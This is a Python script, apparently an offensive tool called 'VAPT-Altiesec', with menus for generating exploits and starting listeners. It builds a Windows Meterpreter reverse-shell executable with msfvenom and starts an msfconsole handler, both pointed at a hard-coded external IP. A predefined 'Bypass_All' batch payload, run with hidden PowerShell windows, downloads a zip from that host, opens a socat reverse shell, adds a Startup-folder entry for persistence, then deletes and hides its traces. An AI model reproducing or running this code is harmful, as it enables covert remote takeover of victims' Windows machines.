import os
import subprocess
import time

# ---------------------------------------fade banner----------------------------------------

def create_gradient_colors(start_color, end_color, steps):
    """Create a list of colors transitioning from start_color to end_color."""
    colors = []
    for step in range(steps):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * step / (steps - 1))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * step / (steps - 1))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * step / (steps - 1))
        colors.append(f"\033[38;2;{r};{g};{b}m")
    return colors

def print_fade_banner():
    # Define start and end colors (Red to Blue)
    start_color = (255, 0, 0)  # Red
    end_color = (0, 0, 255)    # Blue
    steps = 8  # Number of lines in the banner

    # Create a list of colors for the fade effect
    colors = create_gradient_colors(start_color, end_color, steps)

    banner_text = [

"██╗   ██╗ █████╗ ██████╗ ████████╗               █████╗ ██╗  ████████╗██╗███████╗███████╗ ██████╗",
"██║   ██║██╔══██╗██╔══██╗╚══██╔══╝              ██╔══██╗██║  ╚══██╔══╝██║██╔════╝██╔════╝██╔════╝",
"██║   ██║███████║██████╔╝   ██║       █████╗    ███████║██║     ██║   ██║███████╗█████╗  ██║     ",
"╚██╗ ██╔╝██╔══██║██╔═══╝    ██║       ╚════╝    ██╔══██║██║     ██║   ██║╚════██║██╔══╝  ██║     ",
" ╚████╔╝ ██║  ██║██║        ██║                 ██║  ██║███████╗██║   ██║███████║███████╗╚██████╗",
"  ╚═══╝  ╚═╝  ╚═╝╚═╝        ╚═╝                 ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝",
"                       by Aman Raj (irainsec.github.io)"

                ]

    terminal_width = os.get_terminal_size().columns
    print()  # Add space above the banner

    # Print each line of the banner with a fade effect
    for i, line in enumerate(banner_text):
        padding = (terminal_width - len(line)) // 2
        print(f"{colors[i]}{' ' * padding}{line}\033[0m")
        time.sleep(0.1)  # Optional delay for fade effect

    print()  # Add space below the banner

# ---------------------------------------rainbow banner----------------------------------------

def print_rainbow_banner():
    rainbow_colors = [
        (255, 0, 0),    # Red
        (255, 127, 0),  # Orange
        (255, 255, 0),  # Yellow
        (0, 255, 0),    # Green
        (0, 0, 255),    # Blue
        (75, 0, 130),   # Indigo
        (148, 0, 211),  # Violet
    ]

    banner_text = [

"██╗   ██╗ █████╗ ██████╗ ████████╗               █████╗ ██╗  ████████╗██╗███████╗███████╗ ██████╗",
"██║   ██║██╔══██╗██╔══██╗╚══██╔══╝              ██╔══██╗██║  ╚══██╔══╝██║██╔════╝██╔════╝██╔════╝",
"██║   ██║███████║██████╔╝   ██║       █████╗    ███████║██║     ██║   ██║███████╗█████╗  ██║     ",
"╚██╗ ██╔╝██╔══██║██╔═══╝    ██║       ╚════╝    ██╔══██║██║     ██║   ██║╚════██║██╔══╝  ██║     ",
" ╚████╔╝ ██║  ██║██║        ██║                 ██║  ██║███████╗██║   ██║███████║███████╗╚██████╗",
"  ╚═══╝  ╚═╝  ╚═╝╚═╝        ╚═╝                 ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝╚══════╝╚══════╝ ╚═════╝",                                                                                                 
"			by Aman Raj (irainsec.github.io)"

		]

    terminal_width = os.get_terminal_size().columns
    print()  # Add space above the banner
    for i, line in enumerate(banner_text):
        r, g, b = rainbow_colors[i % len(rainbow_colors)]  # Loop colors
        padding = (terminal_width - len(line)) // 2
        print(' ' * padding + f"\033[38;2;{r};{g};{b}m{line}\033[0m")

# ---------------------------------------cowsay error message----------------------------------------

def cowsay(messagespace0, message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2):
    # Create the cow ASCII art
    cow_art = r"""
         \   ^__^
          \  (oo)\_______
             (__)\       )\/\
                 ||----w |
                 ||     ||
    """
    
    # Create a box around the message
    messages = [messagespace0, message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2]
    max_length = max(len(line) for line in messages)
    border = '*' * (max_length + 4)

    print(border)
    for line in messages:
        print(f"* {line:<{max_length}} *")
    print(border)

    print(cow_art)

# ---------------------------------------cowsay exit message----------------------------------------

def exitcowsay(exitmessagespace1, exitmessage1, exitmessagespace2):
    # Create the cow ASCII art
    exitcow_art = r"""
         \   ^__^
          \  (oo)\_______
             (__)\       )\/\
                 ||----w |
                 ||     ||
    """
    
    # Create a box around the message
    exitmessages = [exitmessagespace1, exitmessage1, exitmessagespace2]
    max_length = max(len(line) for line in exitmessages)
    exitborder = '*' * (max_length + 4)
    
    print(exitborder)
    for line in exitmessages:
        print(f"* {line:<{max_length}} *")
    print(exitborder)
    
    print(exitcow_art)

# ---------------------------------------centering menu | clear screen----------------------------------------

def print_centered(text):
    terminal_width = os.get_terminal_size().columns
    centered_text = text.center(terminal_width)
    print(centered_text)

def print_shifted_left(text, padding=10):
    shifted_text = " " * padding + text
    print(shifted_text)

def clear_screen():
    os.system('clear')

# ---------------------------------------menu----------------------------------------

def main_menu():
    print_centered("Main Menu")
    print_shifted_left("[1] Make Exploit")
    print_shifted_left("[2] Listener For Exploits")
    print_shifted_left("[3] Exit")
    print()
    print("Tip: Select an option by entering the corresponding number!")
    print()
    
    choice = input("Select an option: ")
    
    if choice == '1':
        clear_screen()
        print_fade_banner()
        make_exploits_menu()  
    elif choice == '2':
        clear_screen()
        print_fade_banner()
        listener_exploits_menu()  
    elif choice == '3':
        exit_program()  # Exit the tool
    else:
        error_message()
    input("Press Enter to continue...""\n")
    clear_screen()
    main()

def make_exploits_menu():
    print_centered("Make Exploits Menu")
    print_shifted_left("[1] .EXE Exploit")
    print_shifted_left("[2] .BAT Exploits")
    print_shifted_left("[3] Go Back")
    print()
    print("Tip: Select an option by entering the corresponding number!")
    print()
    
    choice = input("Select an option: ")

    if choice == '1':
        clear_screen()
        print_fade_banner()
        make_exe_exploits()
        make_exploits_menu()
    elif choice == '2':
        clear_screen()
        print_fade_banner()
        batch_file_menu()
        make_exploits_menu()
    elif choice == '3':
        clear_screen()
        print_fade_banner()
        main_menu()
    else:
        error_message()
    input("Press Enter to continue...""\n")
    clear_screen()
    print_fade_banner()
    make_exploits_menu()

def listener_exploits_menu():
    print_centered("Listener Exploits Menu")
    print_shifted_left("[1] Meterpreter Listener for .exe Exploits")
    print_shifted_left("[2] Socat Listener for .BAT Exploits")
    print_shifted_left("[3] Go Back")
    print()
    print("Tip: Select an option by entering the corresponding number!")
    print()
    
    choice = input("Select an option: ")

    if choice == '1':
        clear_screen()
        print_fade_banner()
        start_meterpreter_listener()
    elif choice == '2':
        clear_screen()
        print_fade_banner()
        start_Socat_listener()
    elif choice == '3':
        clear_screen()
        print_fade_banner()
        main_menu()
    else:
        error_message()
    input("Press Enter to continue...""\n")
    clear_screen()
    print_fade_banner()
    listener_exploits_menu()

def batch_file_menu():
    print_centered("Batch File Creation Menu")
    print_shifted_left("1. Use Predefined Commands")
    print_shifted_left("2. Enter Custom Commands")
    print_shifted_left("3. Go Back")
    print()
    print("Tip: Select an option by entering the corresponding number!")
    print()
    choice = input("Select an option: ")

    if choice == '1' or choice == '2':
        create_batch_file_workflow(choice)
    elif choice == '3':
        main_menu()
    else:
        print("Invalid option, try again.")
        batch_file_menu()

# ---------------------------------------listener menu options----------------------------------------

def start_meterpreter_listener():
    try:
        # Run Metasploit commands via msfconsole with the provided options
        print("Starting Meterpreter Listener:")
        subprocess.run([
            "msfconsole", 
            "-x", 
            "use exploit/multi/handler; "
            "set payload windows/meterpreter/reverse_tcp; "
            "set LHOST 194.195.114.92; "
            "set LPORT 443; "
            "exploit -j"
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running msfconsole: {e}")
    except FileNotFoundError:
        print("msfconsole is not installed or not found in PATH. Please ensure Metasploit is installed.")

def start_Socat_listener():
    try:
        # Run Socat commands with the provided options
        print("Starting Socat Listener")
        subprocess.run([
            "socat", 
            "-d",
            "-d",
            "OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork",
            "STDOUT"
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except FileNotFoundError:
        print("socat is not installed. Please install socat and try again.")

# ---------------------------------------make exploits menu options----------------------------------------

def make_exe_exploits():
    try:
        subprocess.run([
            "msfvenom", 
            "-p",
            "windows/meterpreter/reverse_tcp",
            "LHOST=194.195.114.92",  # No changes here, but can use f-string if needed
            "LPORT=443",              # Same as above
            "-f",
            "exe",
            "-o",
            "exploit.exe"
        ], check=True)
        print("Payload created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while creating the payload: {e}")
    except FileNotFoundError:
        print("msfvenom is not installed. Please install msfvenom and try again.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

predefined_bat_commands = {
    1: "@Echo off"
        "\npowershell -WindowStyle Hidden new-item C:\Temp -ItemType Directory"
        '\nstart /MIN powershell -WindowStyle Hidden curl -Uri "http://194.195.114.92/payload.zip" -OutFile C:\Temp\payload.zip'
        "\npowershell.exe -WindowStyle Hidden ping -n 5 localhost >nul"
        "\nstart /MIN powershell -WindowStyle Hidden Expand-Archive C:\Temp\payload.zip -DestinationPath C:\Temp"
        "\npowershell.exe -WindowStyle Hidden ping -n 3 localhost >nul"
        "\nstart /MIN C:\Temp\payload\socat OPENSSL:194.195.114.92:4443,verify=0 EXEC:'powershell.exe -WindowStyle Hidden',pipes"
        '\nxcopy /s "C:\Temp\payload\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /K /D /H /Y'
        "\npowershell -WindowStyle Hidden del C:\Temp\payload.zip"
        "\npowershell -WindowStyle Hidden attrib +h +s C:\Temp"
}

def create_batch_file(filename, commands):
    try:
        # Add .bat extension if not provided
        if not filename.endswith('.bat'):
            filename += '.bat'

        # Create and open the .bat file for writing
        with open(filename, 'w') as batch_file:
            # Write the commands into the .bat file
            for command in commands:
                batch_file.write(command + '\n')

        print(f"Batch file '{filename}' created successfully!")
    except Exception as e:
        print(f"Error creating batch file: {e}")

# Function to display predefined commands
def show_predefined_commands():
    print()
    print_shifted_left("[1] Bypass_All")
    print()
    print("Tip: Select an option by entering the corresponding number!")
    print("Type 'custom' to enter your own command or 'done' to finish.")
    print()

# Function to get commands from user
def get_user_commands():
    commands = []
    print("\nEnter the commands you want to add to the batch file.")
    
    while True:
        # Show predefined commands and prompt for user input
        show_predefined_commands()
        choice = input("Select an option (or type 'custom' to enter manually): ").lower()

        if choice == 'done':
            break
        elif choice == 'custom':
            # If the user wants to enter a custom command
            custom_command = input("Enter your custom command: ")
            commands.append(custom_command)
        elif choice.isdigit() and int(choice) in predefined_bat_commands:
            # If a predefined command is selected
            commands.append(predefined_bat_commands[int(choice)])
        else:
            print("Invalid choice, please try again.")
    
    return commands

def create_batch_file_workflow(choice):
    filename = input("\nEnter the name of the batch file: ")

    if choice == '1':
        print("\nYou selected predefined commands.")
        commands = get_user_commands()  # Get predefined or custom commands
    elif choice == '2':
        print("\nYou selected custom commands.")
        commands = get_user_commands()  # Get predefined or custom commands

    create_batch_file(filename, commands)  # Create the batch file with the commands
    main_menu()  # Return to main menu


# ---------------------------------------Errors | Exit program----------------------------------------

def error_message():
    messagespace0 = ("")          
    message1 = ("                Are you dumb bruh? Can't you see the available option?                ")
    messagespace1 = ("")
    message2 = ("  NNNNNNNN        NNNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
    message3 = ("  N:::::::N       N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
    message4 = ("  N::::::::N      N::::::N OO:::::::::::::OO  OO:::::::::::::OO B::::::BBBBBB:::::B   ")
    message5 = ("  N:::::::::N     N::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::B     B:::::B  ")
    message6 = ("  N::::::::::N    N::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
    message7 = ("  N:::::::::::N   N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
    message8 = ("  N:::::::N::::N  N::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
    message9 = ("  N::::::N N::::N N::::::NO:::::O     O:::::OO:::::O     O:::::O  B:::::::::::::BB    ")
    message10 = ("  N::::::N  N::::N:::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::BBBBBB:::::B   ")
    message11 = ("  N::::::N   N:::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
    message12 = ("  N::::::N    N::::::::::NO:::::O     O:::::OO:::::O     O:::::O  B::::B     B:::::B  ")
    message13 = ("  N::::::N     N:::::::::NO::::::O   O::::::OO::::::O   O::::::O  B::::B     B:::::B  ")
    message14 = ("  N::::::N      N::::::::NO:::::::OOO:::::::OO:::::::OOO:::::::OBB:::::BBBBBB::::::B  ")
    message15 = ("  N::::::N       N:::::::N OO:::::::::::::OO  OO:::::::::::::OO B:::::::::::::::::B   ")
    message16 = ("  N::::::N        N::::::N   OO:::::::::OO      OO:::::::::OO   B::::::::::::::::B    ")
    message17 = ("  NNNNNNNN         NNNNNNN     OOOOOOOOO          OOOOOOOOO     BBBBBBBBBBBBBBBBB     ")
    messagespace2 = ("")
    print()
    cowsay(messagespace0, message1, messagespace1, message2, message3, message4, message5, message6, message7, message8, message9, message10, message11, message12, message13, message14, message15, message16, message17, messagespace2)

def exit_program():
    exitmessagespace1 = ("")
    exitmessage1 = ("                                  .....EXITING.....                                    ")
    exitmessagespace2 = ("")
    print()
    exitcowsay(exitmessagespace1, exitmessage1, exitmessagespace2)
    print()
    exit()

# ---------------------------------------Main Functions----------------------------------------

def main():
    clear_screen()
    print_fade_banner()  # Show fade banner on startup
    main_menu()

if __name__ == "__main__":
    main()
